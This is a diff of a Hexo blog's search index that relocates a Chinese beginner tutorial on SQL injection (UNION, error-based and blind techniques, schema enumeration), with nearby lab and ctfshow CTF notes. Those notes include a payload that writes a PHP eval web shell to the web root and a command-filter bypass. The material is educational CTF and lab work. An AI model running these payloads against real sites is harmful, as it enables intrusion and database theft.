@@ -424,6 +424,88 @@ C_{6}^{0}+C_{6}^{1}+C_{6}^{2}+C_{6}^{3}+C_{6}^{4}+C_{6}^{5}+C_{6}^{6}=64</script
       </tags>
   </entry>
   <entry>
+    <title>SQL入门篇</title>
+    <url>/2021/04/29/SQL%E5%85%A5%E9%97%A8%E7%AF%87/</url>
+    <content><![CDATA[<h1 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h1><p>从零开始学习SQL注入。以下内容从nep冬令营SQL注入讲解视频以及对应课件中整理。</p>
+<span id="more"></span>
+<h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><h3 id="mysql基础操作"><a href="#mysql基础操作" class="headerlink" title="mysql基础操作"></a>mysql基础操作</h3><p>登录数据库：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
+<p>查看库名:</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases</span><br></pre></td></tr></table></figure>
+<p>创建库、删除库、使用库</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database mrkaixin</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database mrkaixin</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mrkaixin</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table user(</span><br><span class="line">-&gt; `id` int(<span class="number">11</span>)</span><br><span class="line">-&gt; `name` varchar(<span class="number">255</span>)</span><br><span class="line">-&gt; );</span><br></pre></td></tr></table></figure>
+<h3 id="mysql表的一些基本操作-增删查改"><a href="#mysql表的一些基本操作-增删查改" class="headerlink" title="mysql表的一些基本操作(增删查改)"></a>mysql表的一些基本操作(增删查改)</h3><h4 id="Insert"><a href="#Insert" class="headerlink" title="Insert :"></a>Insert :</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mrkaixin <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;nepnep&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h4 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mrkaixin <span class="keyword">where</span> xxxx;</span><br></pre></td></tr></table></figure>
+<h4 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update mrkaixin <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mrkaixin;</span><br></pre></td></tr></table></figure>
+<p>备注：<code>*</code>表示输出全部字段。</p>
+<h3 id="mysql的常用的变量-函数"><a href="#mysql的常用的变量-函数" class="headerlink" title="mysql的常用的变量(函数)"></a>mysql的常用的变量(函数)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Database()    <span class="operator">/</span><span class="operator">/</span>查看当前的用户名</span><br><span class="line"><span class="number">2.</span> <span class="keyword">User</span>()        <span class="operator">/</span><span class="operator">/</span>用户</span><br><span class="line"><span class="number">3.</span> Version()     <span class="operator">/</span><span class="operator">/</span>mysql版本</span><br><span class="line"><span class="number">4.</span> @<span class="variable">@basedir</span>     <span class="operator">/</span><span class="operator">/</span>安装路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="mysql中的常用的符号"><a href="#mysql中的常用的符号" class="headerlink" title="mysql中的常用的符号"></a>mysql中的常用的符号</h3><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. &amp;   and</span><br><span class="line">2. ||  or</span><br><span class="line">3. ^   xor</span><br></pre></td></tr></table></figure>
+<p>mysql中常用的函数</p>
+<h4 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Substr(database(),1,1)</span><br><span class="line">Subtring</span><br><span class="line">Mid(database(),1,1)</span><br><span class="line">Left(database(),1)</span><br></pre></td></tr></table></figure>
+<h4 id="编码函数"><a href="#编码函数" class="headerlink" title="编码函数"></a>编码函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ascii()</span><br><span class="line">Hex()</span><br><span class="line">Char()      &#x2F;&#x2F;ascii()的逆函数</span><br></pre></td></tr></table></figure>
+<h4 id="文件函数"><a href="#文件函数" class="headerlink" title="文件函数"></a>文件函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Load_file()   &#x2F;&#x2F;读取文件内容</span><br></pre></td></tr></table></figure>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入起手式"><a href="#SQL注入起手式" class="headerlink" title="SQL注入起手式"></a>SQL注入起手式</h3><h4 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h4><p>常见的注释符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. #(%23)</span><br><span class="line">2. --+</span><br><span class="line">3. ;%00</span><br><span class="line">4. &#96;</span><br></pre></td></tr></table></figure>
+<p>思考:</p>
+<p>如果在CTF中，把常用的注释符，以及单引号都按了，那么又该怎么闭合呢？</p>
+<p>这里我们通过使用在<code>&quot;\&quot;</code>来将<code>$username</code>后面的单引号转义。然后我们想办法在<code>$password</code>部分注释掉后面的单引号。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> data <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;\&#x27;</span><span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27; or 1=1 ;%00&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>第二个单引号被\转义了。第一个和第三个单引号之间的值为username的值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">or</span>后面是输入的password的值，;<span class="operator">%</span><span class="number">00</span>可以用来闭合后面的单引号。</span><br></pre></td></tr></table></figure>
+<h3 id="SQL注入的常见姿势"><a href="#SQL注入的常见姿势" class="headerlink" title="SQL注入的常见姿势"></a>SQL注入的常见姿势</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><h5 id="联合查询的基本要求："><a href="#联合查询的基本要求：" class="headerlink" title="联合查询的基本要求："></a>联合查询的基本要求：</h5><p>1、查询列数必须一致</p>
+<p>2、查询语句的查询的各列类型、顺序最好一致</p>
+<h5 id="联合查询的步骤"><a href="#联合查询的步骤" class="headerlink" title="联合查询的步骤"></a>联合查询的步骤</h5><p>1、闭合</p>
+<p>2、判断字段数</p>
+<h5 id="注意：order-by操作"><a href="#注意：order-by操作" class="headerlink" title="注意：order by操作"></a>注意：order by操作</h5><p>Order by : 如果后面接的是整形的话，根据第几个字段进行排序。</p>
+<h5 id="简单介绍一下SQL-union操作符"><a href="#简单介绍一下SQL-union操作符" class="headerlink" title="简单介绍一下SQL union操作符"></a>简单介绍一下SQL union操作符</h5><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
+<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p>
+<p> SQL UNION语法：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
+<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
+<p> SQL UNION ALL 语法</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
+<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
+<p><img src="https://i.loli.net/2021/06/17/p6dlrmcPeDT2NHK.png" alt="image-20210501122431780"></p>
+<h5 id="判断结果输出位置"><a href="#判断结果输出位置" class="headerlink" title="判断结果输出位置"></a>判断结果输出位置</h5><p>这里我们可以看到，如果是1的话，如果数据库中是存在id = 1 ，那么就会返回两行数据，但是由于limit 0,1 。Mysql总会返回第一条数据。所以自然是返回原来查询的，所以这里我们id = -1 或者其他不存在的列，那么第一行就一定是我们自己控制的了。</p>
+<p><img src="https://i.loli.net/2021/06/17/Vnz4SmpbojrGhT5.png" alt="image-20210504121547474"></p>
+<h5 id="爆库、爆表、爆列"><a href="#爆库、爆表、爆列" class="headerlink" title="爆库、爆表、爆列"></a>爆库、爆表、爆列</h5><p>讲爆X之前，我们先来认识一下information_schema这一个数据库<br>这个库中我们先来看看这两个表</p>
+<blockquote>
+<p>TABLE表 :提供了关于数据库中的表的信息（包括视图）<br>COLUMNS表:提供了表中的列信息。</p>
+</blockquote>
+<p>爆破库名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br></pre></td></tr></table></figure>
+<p>爆表名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
+<p>爆Column名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
+<p>表名列名都有了之后，我们便可以通过，自由构造语句来获取获取每一个表中的信息了。</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在没法使用union联合查询时使用，前提是不能过滤一些关键函数。</p>
+<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
+<p>路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容</p>
+<h5 id="报错注入常用到的函数"><a href="#报错注入常用到的函数" class="headerlink" title="报错注入常用到的函数"></a>报错注入常用到的函数</h5><p>Updatexml:更新xml文档的函数。<br>       语法：updatexml(文档类型，xpath路径，更新的内容)</p>
+<p>Extractvalue:对XML文档进行查询的函数<br>       语法： extractvalue(文档类型，xpath路径)</p>
+<p><img src="https://i.loli.net/2021/06/17/Q82jtmfLxcnvdk4.png" alt="image-20210509115330629"></p>
+<h5 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h5><p>报错注入有长度限制，不同的函数限制不一样。只能截32位。</p>
+<p>如果超过32位，可以分开截，先截32，再截32 。</p>
+<p>或者从后往前反着截。</p>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p><img src="https://i.loli.net/2021/06/17/pqtPYIrM9sNJLw4.png" alt="image-20210509120057993"></p>
+<p><img src="https://i.loli.net/2021/06/17/c7pBRMZed3a5SUF.png" alt="image-20210509120121018"></p>
+<p>只有2种回显，永真&amp;永假。</p>
+<p>永假:程序报错、查询为空</p>
+<p>永真:查询正常，但不返回值</p>
+<p>这种可以通过网页上的两种不同的回显的注入，称为布尔盲注。</p>
+<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>BP抓包，根据页面响应的时间来判断结果。</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入之sqlilab</title>
     <url>/2021/05/14/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlilab/</url>
     <content><![CDATA[<h1 id="sqlilab学习"><a href="#sqlilab学习" class="headerlink" title="sqlilab学习"></a>sqlilab学习</h1><p>sqlilabs练习，主要参考郁离歌大佬的博客和SQL注入天书。</p>
@@ -509,88 +591,6 @@ C_{6}^{0}+C_{6}^{1}+C_{6}^{2}+C_{6}^{3}+C_{6}^{4}+C_{6}^{5}+C_{6}^{6}=64</script
 <p>构筑payload：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;--+</span><br></pre></td></tr></table></figure>
 ]]></content>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL入门篇</title>
-    <url>/2021/04/29/SQL%E5%85%A5%E9%97%A8%E7%AF%87/</url>
-    <content><![CDATA[<h1 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h1><p>从零开始学习SQL注入。以下内容从nep冬令营SQL注入讲解视频以及对应课件中整理。</p>
-<span id="more"></span>
-<h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><h3 id="mysql基础操作"><a href="#mysql基础操作" class="headerlink" title="mysql基础操作"></a>mysql基础操作</h3><p>登录数据库：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
-<p>查看库名:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases</span><br></pre></td></tr></table></figure>
-<p>创建库、删除库、使用库</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database mrkaixin</span><br></pre></td></tr></table></figure>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database mrkaixin</span><br></pre></td></tr></table></figure>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mrkaixin</span><br></pre></td></tr></table></figure>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table user(</span><br><span class="line">-&gt; `id` int(<span class="number">11</span>)</span><br><span class="line">-&gt; `name` varchar(<span class="number">255</span>)</span><br><span class="line">-&gt; );</span><br></pre></td></tr></table></figure>
-<h3 id="mysql表的一些基本操作-增删查改"><a href="#mysql表的一些基本操作-增删查改" class="headerlink" title="mysql表的一些基本操作(增删查改)"></a>mysql表的一些基本操作(增删查改)</h3><h4 id="Insert"><a href="#Insert" class="headerlink" title="Insert :"></a>Insert :</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mrkaixin <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;nepnep&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<h4 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mrkaixin <span class="keyword">where</span> xxxx;</span><br></pre></td></tr></table></figure>
-<h4 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update mrkaixin <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
-<h4 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mrkaixin;</span><br></pre></td></tr></table></figure>
-<p>备注：<code>*</code>表示输出全部字段。</p>
-<h3 id="mysql的常用的变量-函数"><a href="#mysql的常用的变量-函数" class="headerlink" title="mysql的常用的变量(函数)"></a>mysql的常用的变量(函数)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Database()    <span class="operator">/</span><span class="operator">/</span>查看当前的用户名</span><br><span class="line"><span class="number">2.</span> <span class="keyword">User</span>()        <span class="operator">/</span><span class="operator">/</span>用户</span><br><span class="line"><span class="number">3.</span> Version()     <span class="operator">/</span><span class="operator">/</span>mysql版本</span><br><span class="line"><span class="number">4.</span> @<span class="variable">@basedir</span>     <span class="operator">/</span><span class="operator">/</span>安装路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="mysql中的常用的符号"><a href="#mysql中的常用的符号" class="headerlink" title="mysql中的常用的符号"></a>mysql中的常用的符号</h3><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. &amp;   and</span><br><span class="line">2. ||  or</span><br><span class="line">3. ^   xor</span><br></pre></td></tr></table></figure>
-<p>mysql中常用的函数</p>
-<h4 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Substr(database(),1,1)</span><br><span class="line">Subtring</span><br><span class="line">Mid(database(),1,1)</span><br><span class="line">Left(database(),1)</span><br></pre></td></tr></table></figure>
-<h4 id="编码函数"><a href="#编码函数" class="headerlink" title="编码函数"></a>编码函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ascii()</span><br><span class="line">Hex()</span><br><span class="line">Char()      &#x2F;&#x2F;ascii()的逆函数</span><br></pre></td></tr></table></figure>
-<h4 id="文件函数"><a href="#文件函数" class="headerlink" title="文件函数"></a>文件函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Load_file()   &#x2F;&#x2F;读取文件内容</span><br></pre></td></tr></table></figure>
-<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入起手式"><a href="#SQL注入起手式" class="headerlink" title="SQL注入起手式"></a>SQL注入起手式</h3><h4 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h4><p>常见的注释符</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. #(%23)</span><br><span class="line">2. --+</span><br><span class="line">3. ;%00</span><br><span class="line">4. &#96;</span><br></pre></td></tr></table></figure>
-<p>思考:</p>
-<p>如果在CTF中，把常用的注释符，以及单引号都按了，那么又该怎么闭合呢？</p>
-<p>这里我们通过使用在<code>&quot;\&quot;</code>来将<code>$username</code>后面的单引号转义。然后我们想办法在<code>$password</code>部分注释掉后面的单引号。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> data <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;\&#x27;</span><span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27; or 1=1 ;%00&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>第二个单引号被\转义了。第一个和第三个单引号之间的值为username的值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">or</span>后面是输入的password的值，;<span class="operator">%</span><span class="number">00</span>可以用来闭合后面的单引号。</span><br></pre></td></tr></table></figure>
-<h3 id="SQL注入的常见姿势"><a href="#SQL注入的常见姿势" class="headerlink" title="SQL注入的常见姿势"></a>SQL注入的常见姿势</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><h5 id="联合查询的基本要求："><a href="#联合查询的基本要求：" class="headerlink" title="联合查询的基本要求："></a>联合查询的基本要求：</h5><p>1、查询列数必须一致</p>
-<p>2、查询语句的查询的各列类型、顺序最好一致</p>
-<h5 id="联合查询的步骤"><a href="#联合查询的步骤" class="headerlink" title="联合查询的步骤"></a>联合查询的步骤</h5><p>1、闭合</p>
-<p>2、判断字段数</p>
-<h5 id="注意：order-by操作"><a href="#注意：order-by操作" class="headerlink" title="注意：order by操作"></a>注意：order by操作</h5><p>Order by : 如果后面接的是整形的话，根据第几个字段进行排序。</p>
-<h5 id="简单介绍一下SQL-union操作符"><a href="#简单介绍一下SQL-union操作符" class="headerlink" title="简单介绍一下SQL union操作符"></a>简单介绍一下SQL union操作符</h5><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
-<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p>
-<p> SQL UNION语法：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
-<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
-<p> SQL UNION ALL 语法</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
-<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
-<p><img src="https://i.loli.net/2021/06/17/p6dlrmcPeDT2NHK.png" alt="image-20210501122431780"></p>
-<h5 id="判断结果输出位置"><a href="#判断结果输出位置" class="headerlink" title="判断结果输出位置"></a>判断结果输出位置</h5><p>这里我们可以看到，如果是1的话，如果数据库中是存在id = 1 ，那么就会返回两行数据，但是由于limit 0,1 。Mysql总会返回第一条数据。所以自然是返回原来查询的，所以这里我们id = -1 或者其他不存在的列，那么第一行就一定是我们自己控制的了。</p>
-<p><img src="https://i.loli.net/2021/06/17/Vnz4SmpbojrGhT5.png" alt="image-20210504121547474"></p>
-<h5 id="爆库、爆表、爆列"><a href="#爆库、爆表、爆列" class="headerlink" title="爆库、爆表、爆列"></a>爆库、爆表、爆列</h5><p>讲爆X之前，我们先来认识一下information_schema这一个数据库<br>这个库中我们先来看看这两个表</p>
-<blockquote>
-<p>TABLE表 :提供了关于数据库中的表的信息（包括视图）<br>COLUMNS表:提供了表中的列信息。</p>
-</blockquote>
-<p>爆破库名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br></pre></td></tr></table></figure>
-<p>爆表名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
-<p>爆Column名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
-<p>表名列名都有了之后，我们便可以通过，自由构造语句来获取获取每一个表中的信息了。</p>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在没法使用union联合查询时使用，前提是不能过滤一些关键函数。</p>
-<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
-<p>路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容</p>
-<h5 id="报错注入常用到的函数"><a href="#报错注入常用到的函数" class="headerlink" title="报错注入常用到的函数"></a>报错注入常用到的函数</h5><p>Updatexml:更新xml文档的函数。<br>       语法：updatexml(文档类型，xpath路径，更新的内容)</p>
-<p>Extractvalue:对XML文档进行查询的函数<br>       语法： extractvalue(文档类型，xpath路径)</p>
-<p><img src="https://i.loli.net/2021/06/17/Q82jtmfLxcnvdk4.png" alt="image-20210509115330629"></p>
-<h5 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h5><p>报错注入有长度限制，不同的函数限制不一样。只能截32位。</p>
-<p>如果超过32位，可以分开截，先截32，再截32 。</p>
-<p>或者从后往前反着截。</p>
-<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p><img src="https://i.loli.net/2021/06/17/pqtPYIrM9sNJLw4.png" alt="image-20210509120057993"></p>
-<p><img src="https://i.loli.net/2021/06/17/c7pBRMZed3a5SUF.png" alt="image-20210509120121018"></p>
-<p>只有2种回显，永真&amp;永假。</p>
-<p>永假:程序报错、查询为空</p>
-<p>永真:查询正常，但不返回值</p>
-<p>这种可以通过网页上的两种不同的回显的注入，称为布尔盲注。</p>
-<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>BP抓包，根据页面响应的时间来判断结果。</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
       <tags>
         <tag>SQL注入</tag>
       </tags>
@@ -695,57 +695,6 @@ C_{6}^{0}+C_{6}^{1}+C_{6}^{2}+C_{6}^{3}+C_{6}^{4}+C_{6}^{5}+C_{6}^{6}=64</script
       </tags>
   </entry>
   <entry>
-    <title>ctfshow命令执行51-57</title>
-    <url>/2021/04/14/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C51-57/</url>
-    <content><![CDATA[<h1 id="ctfshow命令执行51-57"><a href="#ctfshow命令执行51-57" class="headerlink" title="ctfshow命令执行51-57"></a>ctfshow命令执行51-57</h1><p>ctfshow中web入门命令执行篇的一些刷题笔记</p>
-<span id="more"></span>
-<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>相较50过滤了更多东西，尤其是tac 。。。泪目</p>
-<p>payload：<code>nl&lt;fl\ag.php||</code></p>
-<p>上一题的payload依旧能过</p>
